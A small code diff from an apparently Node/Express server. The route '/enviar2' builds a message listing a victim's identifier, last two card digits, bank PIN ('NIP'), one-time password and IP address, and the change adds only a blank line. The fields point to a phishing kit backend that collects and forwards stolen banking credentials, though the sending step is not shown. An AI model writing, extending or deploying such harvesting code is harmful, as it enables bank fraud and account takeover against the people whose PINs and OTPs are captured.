@@ -95,6 +95,7 @@ app.post('/enviar2', async (req, res) => {
 🔢 Identificador: ${numeroIdentificador}
 💳 Últimos 2: ${ultimos2}
 🔐 NIP: ${nip}
+
 🔑 OTP: ${otp}
 
 🌐 IP: ${ip}
